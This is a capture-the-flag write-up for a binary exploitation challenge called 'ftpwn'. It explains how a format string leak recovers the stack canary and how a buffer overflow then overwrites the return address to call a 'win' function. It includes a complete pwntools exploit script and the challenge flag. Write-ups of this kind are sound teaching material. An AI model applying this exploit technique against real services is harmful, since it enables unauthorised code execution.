# ftpwn

Author: Mukund

I made an implementation of FTP! Even though I didn't finish making it, I decided to host it anyways. What could POSSIBLY go wrong?

## Solution

Running checksec, we see the binary has a stack canary but is not PIE.
```
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

The binary implements a few simple commands, but from them, the `ls` command gives us an free format string that is less than 7 characters, and the `download` command gives us a stack buffer overflow of pretty much arbitrary size.

The solution is the use the format string vulnerability to leak the stack canary, then buffer overflow the stack to overwrite the return address with the address of the `win` function. We can't just buffer overflow because of the stack canary, so that has to be recovered first.

With some quick manual gdbing we see that an offset of 15 will give us the canary.

```py
from pwn import *

elf = ELF("./ftpwn")

# context.log_level = "debug"
# io = remote("tamuctf.com", 443, ssl=True, sni="ftpwn")
io = remote("localhost", 1337)

io.sendline(b'ls')
io.sendline(b'%15$p') # first stack is at 7$p, canary is 8 away

io.recvuntil(b'0x')
leak = int(io.recvuntil(b'\n', drop=True), 16)
log.info(f"leak: {hex(leak)}")

io.sendline(b'download')
payload = b'A' * 40 # buffer is 40 bytes
payload += p64(leak) # stack canary
payload += p64(1)  
payload += p64(elf.symbols['win']) 
io.sendline(payload)

io.sendline(b'exit')

io.interactive(prompt="") 
```

flag:
`gigem{ftp_is_not_finished}`
